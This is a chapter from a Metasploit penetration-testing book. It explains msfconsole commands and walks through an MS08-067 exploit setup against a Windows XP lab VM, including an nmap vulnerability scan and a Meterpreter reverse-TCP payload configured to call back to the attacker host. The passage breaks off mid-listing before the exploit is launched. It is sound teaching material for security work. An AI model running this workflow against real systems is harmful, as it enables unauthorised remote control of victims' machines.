<html><head></head><body><section epub:type="chapter" id="the_joy_of_exploitation"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 5. The Joy of Exploitation</h2></div></div></div><p class="calibre2">Exploitation is the pinnacle of many security professionals’ careers. The ability to gain full control over a targeted machine is a great feeling, if perhaps a little scary. But even though exploitation techniques have advanced quite a bit over the years, the adoption of various system and network protections has made it increasingly more difficult to succeed with basic exploits. In this chapter, we move into more difficult attack methods, beginning with command-line interfaces to the Metasploit Framework. Most of the attacks and customizations discussed in this chapter will occur in <span class="strong"><em class="calibre4">msfconsole</em></span>, <span class="strong"><em class="calibre4">msfencode</em></span>, and <span class="strong"><em class="calibre4">msfpayload</em></span>.<a id="IDX-CHP-5-0001" class="strong"/></p><p class="calibre2">Before you begin to exploit systems, you need to understand a few things about penetration testing and exploitation. In <a class="xref" href="part0005.html#the_absolute_basics_of_penetration_testi">Chapter 1</a> you were introduced to basic penetration testing methods. In <a class="xref" href="part0006.html#metasploit_basics">Chapter 2</a> you learned the basics of the Framework and what to expect from each tool. In <a class="xref" href="part0007.html#intelligence_gathering-id1">Chapter 3</a> we explored the intelligence gathering phase, and in <a class="xref" href="part0008.html#vulnerability_scanning">Chapter 4</a> you learned about vulnerability scanning.</p><p class="calibre2">In this chapter, we focus on the basics of exploitation. Our goal is to familiarize you with the different commands available through the Framework, which we’ll build upon in later chapters. Most of the attacks from this point forward will occur through <span class="strong"><em class="calibre4">msfconsole</em></span>, and you will need a solid understanding of <span class="strong"><em class="calibre4">msfconsole</em></span>, <span class="strong"><em class="calibre4">msfpayload</em></span>, and <span class="strong"><em class="calibre4">msfencode</em></span> to get the most out of the balance of this book.<a id="IDX-CHP-5-0002" class="strong"/><a id="IDX-CHP-5-0003" class="strong"/><a id="IDX-CHP-5-0004" class="strong"/><a id="IDX-CHP-5-0005" class="strong"/><a id="IDX-CHP-5-0006" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="basic_exploitation">Basic Exploitation</h2></div></div></div><p class="calibre2">The Metasploit Framework contains hundreds of modules, and it’s nearly impossible to remember them all. Running <code class="literal">show</code> from <span class="strong"><em class="calibre4">msfconsole</em></span> will display every module available in the Framework, but you can also narrow your search by displaying only specific types of modules as discussed in the following sections.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="msfg_show_exploits">msf&gt; show exploits</h3></div></div></div><p class="calibre2">Within <span class="strong"><em class="calibre4">msfconsole</em></span>, exploits operate against the vulnerabilities that you discover during a penetration test. New exploits are always being developed, and the list will continue to grow. This command will display every currently available exploit within the Framework.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="msfg_show_auxiliary">msf&gt; show auxiliary</h3></div></div></div><p class="calibre2">Auxiliary modules in Metasploit can be used for a wide range of purposes. They can operate as scanners, denial-of-service modules, fuzzers, and much more. This command will display them and list their features.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="msfg_show_options">msf&gt; show options</h3></div></div></div><p class="calibre2">Options control various settings needed for proper functionality of the Framework modules. When you run <code class="literal">show options</code> while a module is selected, Metasploit will display only the options that apply to that particular module. Entering <code class="literal">msf&gt; show options</code> when not in a module will display the available global options — for example, you can set <code class="literal">LogLevel</code> to be more verbose as you perform an attack. You can also issue the <code class="literal">back</code> command to go back once inside a module.<a id="IDX-CHP-5-0007" class="strong"/></p><a id="I_programlisting5_d1e4789" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use windows/smb/ms08_067_netapi</code></strong>
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">back</code></strong>
msf &gt;</pre><p class="calibre2">The <code class="literal">search</code> command is useful for finding a specific attack, auxiliary module, or payload. For example, if you want to launch an attack against SQL, you could search for SQL like this:</p><a id="I_programlisting5_d1e4802" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">search mssql</code></strong>
[*] Searching loaded modules for pattern 'mssql'...

Auxiliary
=========

   Name                       Disclosure Date  Rank    Description
   ----                       ---------------  ----    -----------
   admin/mssql/mssql_enum                      normal
  Microsoft SQL Server Configuration
                                                         Enumerator
   admin/mssql/mssql_exec                      normal
  Microsoft SQL Server xp_cmdshell
                                                         Command Execution
   admin/mssql/mssql_idf                       normal
  Microsoft SQL Server - Interesting
                                                         Data Finder
   admin/mssql/mssql_sql                       normal
  Microsoft SQL Server Generic Query
   scanner/mssql/mssql_login                   normal  MSSQL Login Utility
   scanner/mssql/mssql_ping                    normal  MSSQL Ping Utility
Exploits

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

msf &gt;</pre><p class="calibre2">Or, to find the MS08-067 exploit specifically (an exploit related to the notorious Conficker worm that exploited a weakness within the Remote Procedure Call [RPC] service), you would enter this command:<a id="IDX-CHP-5-0008" class="strong"/><a id="IDX-CHP-5-0009" class="strong"/><a id="IDX-CHP-5-0010" class="strong"/><a id="IDX-CHP-5-0011" class="strong"/><a id="IDX-CHP-5-0012" class="strong"/><a id="IDX-CHP-5-0013" class="strong"/><a id="IDX-CHP-5-0014" class="strong"/><a id="IDX-CHP-5-0015" class="strong"/></p><a id="I_programlisting5_d1e4836" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">search ms08_067</code></strong>
[*] Searching loaded modules for pattern 'ms08_067'...

Exploits
========

   Name                         Rank   Description
   ----                         ----   -----------
   <strong class="calibre3"><code class="calibre6">windows/smb/ms08_067_netapi</code></strong>
  great  Microsoft Server Service Relative Path Stack Corruption</pre><p class="calibre2">Then, having found an exploit (<span class="strong"><em class="calibre4">windows/smb/ms08_067_netapi</em></span>), you could load the found module with the <code class="literal">use</code> command, like so:</p><a id="I_programlisting5_d1e4852" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use windows/smb/ms08_067_netapi</code></strong>
msf exploit(ms08_067_netapi) &gt;</pre><p class="calibre2">Notice that when we issue the <code class="literal">use windows/smb/ms08_067_netapi</code> command, the <code class="literal">msf</code> prompt changes as follows:</p><a id="I_programlisting5_d1e4865" class="strong"/><pre class="programlisting">msf exploit(ms08_067_netapi) &gt;</pre><p class="calibre2">This indicates that we have selected the <span class="strong"><em class="calibre4">ms08_067_netapi</em></span> module and that commands issued at this prompt will be performed under that exploit.</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">You can perform a <code class="literal">search</code> or <code class="literal">use</code> at any time within an exploit to switch to a different exploit or module.<a id="IDX-CHP-5-0016" class="strong"/><a id="IDX-CHP-5-0017" class="strong"/><a id="IDX-CHP-5-0018" class="strong"/><a id="IDX-CHP-5-0019" class="strong"/></p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">Now, with the prompt reflecting our chosen module, we can enter <code class="literal">show options</code> to display the options specific to the MS08-067 exploit:<a id="IDX-CHP-5-0020" class="strong"/></p><a id="I_programlisting5_d1e4902" class="strong"/><pre class="programlisting">msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting

msf exploit(ms08_067_netapi) &gt;</pre><p class="calibre2">This contextual approach to accessing options keeps the interface simpler and allows you to focus only on the options that matter at the moment.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="msfg_show_payloads">msf&gt; show payloads</h3></div></div></div><p class="calibre2">Recall from <a class="xref" href="part0006.html#metasploit_basics">Chapter 2</a> that payloads are platform-specific portions of code delivered to a target. As with <code class="literal">show options</code>, when you run <code class="literal">show payloads</code> from a module-specific prompt, Metasploit displays only the payloads that are compatible with that module. In the case of Microsoft Windows–based exploits, these payloads may be as simple as a command prompt on the target or as complex as a full graphical interface on the target machine. To see an active list of payloads, run the following command:<a id="IDX-CHP-5-0021" class="strong"/></p><a id="I_programlisting5_d1e4929" class="strong"/><pre class="programlisting">msf&gt; <strong class="calibre3"><code class="calibre6">show payloads</code></strong></pre><p class="calibre2">This would show you all payloads available in Metasploit; however, if you are in an actual exploit, you will see only payloads applicable to the attack. For example, running <code class="literal">show payloads</code> from the <code class="literal">msf exploit(ms08_067_netapi)</code> prompt would result in the output shown next.</p><p class="calibre2">In the previous example we searched for the MS08-067 module. Now let’s find out the payloads for that module by entering <code class="literal">show payloads</code>. Notice in the example that only Windows-based payloads are shown. Metasploit will generally identify the type of payloads that can be used with a particular attack.</p><a id="I_programlisting5_d1e4946" class="strong"/><pre class="programlisting">msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">show payloads</code></strong>

Compatible Payloads
===================

Name                                             Rank    Description
----                                             ----    -----------

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

windows/shell/reverse_ipv6_tcp                   normal
  Windows Command Shell, Reverse TCP
                                                           Stager (IPv6)
windows/shell/reverse_nonx_tcp                   normal
  Windows Command Shell, Reverse TCP
                                                           Stager (No NX or Win7)
windows/shell/reverse_ord_tcp                    normal
  Windows Command Shell, Reverse


                                                 Ordinal TCP Stager (No NX or Win7)
windows/shell/reverse_tcp                        normal
  Windows Command Shell, Reverse TCP
                                                           Stager
windows/shell/reverse_tcp_allports               normal
  Windows Command Shell, Reverse
                                                           All-Port TCP Stager
windows/shell_bind_tcp                           normal
  Windows Command Shell, Bind TCP
                                                           Inline
windows/shell_reverse_tcp                        normal
  Windows Command Shell, Reverse TCP
                                                           Inline</pre><p class="calibre2">Next, we enter <code class="literal">set payload windows/shell/reverse_tcp</code> to select the <code class="literal">reverse_tcp</code> payload. When we enter <code class="literal">show options</code> again we see that additional options are shown:<a id="IDX-CHP-5-0022" class="strong"/><a id="IDX-CHP-5-0023" class="strong"/></p><a id="I_programlisting5_d1e4971" class="strong"/><pre class="programlisting">msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set payload windows/shell/reverse_tcp</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
  payload =&gt; windows/shell/reverse_tcp
  msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>

  Module options:

     Name     Current Setting  Required  Description
     ----     ---------------  --------  -----------
     RHOST                     yes       The target address
     RPORT    445              yes       Set the SMB service port
     SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>   Payload options (windows/shell/reverse_tcp):

     Name      Current Setting  Required  Description
     ----      ---------------  --------  -----------
     EXITFUNC  thread           yes       Exit technique: seh, thread, process
     LHOST                      yes       The local address
     LPORT     4444             yes       The local port</pre><p class="calibre2">Notice that when the payload is selected at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e4999" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and the options are displayed at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5005" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, we are presented with some additional options in the payload section at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5011" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, such as <code class="literal">LHOST</code> and <code class="literal">LPORT</code>. In this example, you could configure the payload to connect back to the attacker machine on a specific IP address and port number, called a <span class="strong"><em class="calibre4">reverse payload</em></span>. In reverse payloads, the connection is actually triggered by the target machine and it connects to the attacker. You might use this technique to circumvent a firewall or NAT installation.<a id="IDX-CHP-5-0024" class="strong"/><a id="IDX-CHP-5-0025" class="strong"/><a id="IDX-CHP-5-0026" class="strong"/><a id="IDX-CHP-5-0027" class="strong"/><a id="IDX-CHP-5-0028" class="strong"/><a id="IDX-CHP-5-0029" class="strong"/></p><p class="calibre2">We’ll configure this exploit with both the <code class="literal">LHOST</code> and <code class="literal">RHOST</code> options. <code class="literal">LHOST</code>, our attacking machine, will connect back from the target machine (<code class="literal">RHOST</code>) on the default TCP port (4444).</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="msfg_show_targets">msf&gt; show targets</h3></div></div></div><p class="calibre2">Modules often list vulnerable potential targets. For example, because the vulnerability targeted by MS08-067 relies on hard-coded memory addresses, the exploit is specific to operating systems with specific patch levels, language version, and security implementations (as explained in detail in <a class="xref" href="part0018.html#creating_your_own_exploits">Chapter 14</a> and <a class="xref" href="part0019.html#porting_exploits_to_the_metasploit_frame">Chapter 15</a>). Using the <code class="literal">show targets</code> command at the <code class="literal">msf MS08-067</code> prompt displays a list of 60 exploit targets (with only a portion shown in the following example). The success of the exploit will depend on the version of Windows you are targeting. Sometimes automatic detection will not work and could even trigger the wrong exploit, which will usually lead to a service crash.<a id="IDX-CHP-5-0030" class="strong"/></p><a id="I_programlisting5_d1e5083" class="strong"/><pre class="programlisting">msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">show targets</code></strong>

  Exploit targets:

     Id  Name
   --  ----
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>    0   Automatic Targeting
     1   Windows 2000 Universal
     2   Windows XP SP0/SP1 Universal
     3   Windows XP SP2 English (NX)
     4   Windows XP SP3 English (NX)
     5   Windows 2003 SP0 Universal
     6   Windows 2003 SP1 English (NO NX)
     7   Windows 2003 SP1 English (NX)
     8   Windows 2003 SP2 English (NO NX)
     9   Windows 2003 SP2 English (NX)</pre><p class="calibre2">In this example, you can see that the exploit lists Automatic Targeting <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5096" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> as one option. Often, an exploit module will attempt to target the operating system automatically based on its version and select an exploit based on the system’s fingerprint. However, it’s often best to try to identify the appropriate exploit yourself to avoid triggering the wrong exploit or a potentially destructive one.</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">This particular exploit is temperamental, and it has a tough time determining the operating system. If you use this exploit, be sure to set the target as the specific operating system you use in testing on your VM (Windows XP SP2).</p></div><div class="book"><hr class="calibre5"/></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="info">info</h3></div></div></div><p class="calibre2">When the short description of a module provided by the <code class="literal">show</code> and <code class="literal">search</code> commands isn’t sufficient, use the <code class="literal">info</code> command followed by the module name to display all the information, options, and targets available for that module:<a id="IDX-CHP-5-0031" class="strong"/><a id="IDX-CHP-5-0032" class="strong"/><a id="IDX-CHP-5-0033" class="strong"/><a id="IDX-CHP-5-0034" class="strong"/><a id="IDX-CHP-5-0035" class="strong"/><a id="IDX-CHP-5-0036" class="strong"/></p><a id="I_programlisting5_d1e5146" class="strong"/><pre class="programlisting">msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">info</code></strong></pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="set_and_unset">set and unset</h3></div></div></div><p class="calibre2">All the options for a given Metasploit module must be either set or unset, especially if they are marked as <span class="strong"><em class="calibre4">required</em></span> or <span class="strong"><em class="calibre4">yes</em></span>. When you enter <code class="literal">show options</code>, you will see information that specifies whether a field is required. Use the <code class="literal">set</code> command to set an option (turn it on); use <code class="literal">unset</code> to turn a setting off. The next listing shows the <code class="literal">set</code> and <code class="literal">unset</code> commands in use.</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">Notice that the variables are referenced using uppercase characters. This isn’t required, but it is considered good practice.</p></div><div class="book"><hr class="calibre5"/></div><a id="I_programlisting5_d1e5180" class="strong"/><pre class="programlisting">msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 192.168.1.155</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
RHOST =&gt; 192.168.1.155
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set TARGET 3</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
TARGET =&gt; 3
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>

Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.1.155    yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:

   Id  Name
   --  ----
   3   Windows XP SP2 English (NX)

msf exploit(ms08_067_netapi) &gt; unset RHOST
Unsetting RHOST...</pre><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5212" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> we set the target IP address (<code class="literal">RHOST</code>) to <code class="literal">192.168.1.155</code> (our target machine). At <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5224" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> we <code class="literal">set</code> the target to <code class="literal">3</code>, the “Windows XP SP2 English (NX)” that we listed with <code class="literal">show targets</code> in <a class="xref" href="part0009.html#msfg_show_targets">msf&gt; show targets</a> in <a class="xref" href="part0009.html#msfg_show_targets">msf&gt; show targets</a>. Running <code class="literal">show options</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5247" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> confirms that our settings have been populated, as shown in the <code class="literal">Module options</code> output.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="setg_and_unsetg">setg and unsetg</h3></div></div></div><p class="calibre2">The <code class="literal">setg</code> and <code class="literal">unsetg</code> commands are used to set or unset a parameter globally within <span class="strong"><em class="calibre4">msfconsole</em></span>. Using these commands can save you from having to re-enter the same information repeatedly, particularly in the case of frequently used options that rarely change, such as <code class="literal">LHOST</code>.<a id="IDX-CHP-5-0037" class="strong"/><a id="IDX-CHP-5-0038" class="strong"/><a id="IDX-CHP-5-0039" class="strong"/><a id="IDX-CHP-5-0040" class="strong"/><a id="IDX-CHP-5-0041" class="strong"/><a id="IDX-CHP-5-0042" class="strong"/><a id="IDX-CHP-5-0043" class="strong"/><a id="IDX-CHP-5-0044" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="save">save</h3></div></div></div><p class="calibre2">Having configured global options with the <code class="literal">setg</code> command, use the <code class="literal">save</code> command to save your current settings so they will be available next time you run the console. You can enter the <code class="literal">save</code> command at any time in Metasploit to save your current place.</p><a id="I_programlisting5_d1e5325" class="strong"/><pre class="programlisting">msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">save</code></strong>
Saved configuration to: /root/.msf3/config
msf exploit(ms08_067_netapi) &gt;</pre><p class="calibre2">The location in which the configuration is stored, <span class="strong"><em class="calibre4">/root/.msf3/config</em></span>, is shown on the screen. If for some reason you need to start over, move or delete this file to revert to the default settings.</p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="exploiting_your_first_machine">Exploiting Your First Machine</h2></div></div></div><p class="calibre2">With some of the basics behind us and an understanding of how to set variables within <span class="strong"><em class="calibre4">msfconsole</em></span>, let’s exploit our first machine. To do so, fire up your Windows XP Service Pack 2 and Ubuntu 9.04 virtual machines. We’ll use Metasploit from within Back|Track.</p><p class="calibre2">If you used the vulnerability scanners discussed in <a class="xref" href="part0008.html#vulnerability_scanning">Chapter 4</a> against your virtual Windows XP SP2 machine, you will have encountered the vulnerability we’ll exploit in this chapter: the MS08-067 exploit. We’ll begin by finding this vulnerability on our own.</p><p class="calibre2">As your skills as a penetration tester improve, the discovery of certain open ports will trigger ideas about how you might exploit a particular service. One of the best ways to conduct this check is by using <span class="strong"><em class="calibre4">nmap</em></span>’s script options within Metasploit as shown here:<a id="IDX-CHP-5-0045" class="strong"/></p><a id="I_programlisting5_d1e5357" class="strong"/><pre class="programlisting">root@bt:/root# <strong class="calibre3"><code class="calibre6">cd /opt/framework3/msf3/</code></strong>
root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">msfconsole</code></strong>

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

msf &gt; <strong class="calibre3"><code class="calibre6">nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
[*] exec: nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130

Starting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:46 EDT
Warning: Traceroute does not support idle or connect scan, disabling...
NSE: Script Scanning completed.
Nmap scan report for 192.168.33.130
Host is up (0.00050s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
25/tcp   open  smtp         Microsoft ESMTP 6.0.2600.2180
80/tcp   open  http         Microsoft IIS webserver 5.1
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
443/tcp  open  https?
445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds
1025/tcp open  msrpc        Microsoft Windows RPC
1433/tcp open  ms-sql-s     Microsoft SQL Server 2005 9.00.1399; RTM
MAC Address: 00:0C:29:EA:26:7C (VMware)
Device type: general purpose
Running: Microsoft Windows XP|2003
OS details: <strong class="calibre3"><code class="calibre6">Microsoft Windows XP Professional SP2 or Windows Server 2003</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
Network Distance: 1 hop
Service Info: Host: ihazsecurity; OS: Windows

Host script results:
 smb-check-vulns:
   <strong class="calibre3"><code class="calibre6">MS08-067: VULNERABLE</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
   Conficker: Likely CLEAN
   regsvc DoS: CHECK DISABLED (add '--script-args=unsafe=1' to run)
   SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add '--script-args=unsafe=1' to run)

OS and Service detection performed. Please report any incorrect
 results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.67 seconds
msf &gt;</pre><p class="calibre2">Here, we call <span class="strong"><em class="calibre4">nmap</em></span> from Metasploit with the <code class="literal">--script=smb-check-vulns</code> plug-in at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5404" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. Notice the flags used while scanning the host with <span class="strong"><em class="calibre4">nmap</em></span>. The <code class="literal">-sT</code> is a Stealth TCP connect, which we have found to be the most reliable flag when trying to enumerate ports. (Others prefer <code class="literal">-sS</code>, or Stealth Syn.) The <code class="literal">-A</code> specifies advanced OS detection, which does some additional banner grabs and footprinting of a specific service for us.<a id="IDX-CHP-5-0046" class="strong"/><a id="IDX-CHP-5-0047" class="strong"/><a id="IDX-CHP-5-0048" class="strong"/><a id="IDX-CHP-5-0049" class="strong"/><a id="IDX-CHP-5-0050" class="strong"/></p><p class="calibre2">Notice in the results from <span class="strong"><em class="calibre4">nmap</em></span> that <code class="literal">MS08-067: VULNERABLE</code> is reported at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5446" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. This is a good indicator that we have a chance at exploiting this system. Let’s use Metasploit to find the exploit we want and attempt to compromise the system.</p><p class="calibre2">This exploit is specific to the operating system version, service pack, and language in use on the system, a result of the exploit bypassing Data Execution Prevention (DEP). DEP was created to help protect against buffer overflow attacks by rendering the stack read-only and thereby preventing arbitrarily placed shellcode from executing. However, we can bypass DEP and force Windows to make the stack writable by performing some complex stack manipulation. (For more on bypassing DEP, see <a class="xref" href="http://www.uninformed.org/?v=2&amp;a=4" target="_top">http://www.uninformed.org/?v=2&amp;a=4</a>.)<a id="IDX-CHP-5-0051" class="strong"/></p><p class="calibre2">In <a class="xref" href="part0009.html#msfg_show_targets">msf&gt; show targets</a> in <a class="xref" href="part0009.html#msfg_show_targets">msf&gt; show targets</a>, we used the <code class="literal">show targets</code> command, which lists each vulnerable version for this specific attack vector. Because MS08-067 is an exploit that is very specific regarding the OS version in use, we will manually set our target to make sure we trigger the correct overflow. Based on the <span class="strong"><em class="calibre4">nmap</em></span> scan results shown in the preceding example, we can tell at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5471" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> that the system is running Windows XP Service Pack 2. (It is also identified as possibly Windows 2003, but the system is missing key ports that would be associated with the Server Edition.) We’ll assume that our target is running the English version of XP.</p><p class="calibre2">Let’s walk through the actual exploitation. First the setup:</p><a id="I_programlisting5_d1e5479" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">search ms08_067_netapi</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
[*] Searching loaded modules for pattern 'ms08_067_netapi'...

Exploits
========

   Name                         Rank   Description
   ----                         ----   -----------
   windows/smb/ms08_067_netapi  great  Microsoft Server
 Service Relative Path Stack Corruption

msf &gt; <strong class="calibre3"><code class="calibre6">use windows/smb/ms08_067_netapi</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set PAYLOAD windows/meterpreter/reverse_tcp</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">show targets</code></strong> <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>

Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   <strong class="calibre3"><code class="calibre6">3   Windows XP SP2 English (NX)</code></strong> <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/>
   4   Windows XP SP3 English (NX)
   5   Windows 2003 SP0 Universal
   6   Windows 2003 SP1 English (NO NX)
   7   Windows 2003 SP1 English (NX)
   8   Windows 2003 SP2 English (NO NX)
   9   Windows 2003 SP2 English (NX)

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

   26  Windows XP SP2 Japanese (NX)

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set TARGET 3</code></strong>
target =&gt; 3
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 192.168.33.130</code></strong> <img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre7"/>
RHOST =&gt; 192.168.33.130
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 192.168.33.129</code></strong> <img src="../images/00027.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867508.png" class="calibre7"/>
LHOST =&gt; 192.168.33.129
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set LPORT 8080</code></strong> <img src="../images/00028.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867510.png" class="calibre7"/>
LPORT =&gt; 8080
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong> <img src="../images/00029.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867512.png" class="calibre7"/>

Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.33.130   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST     192.168.33.129   yes       The local address
   LPORT     8080             yes       The local port

Exploit target:

   Id  Name
   --  ----
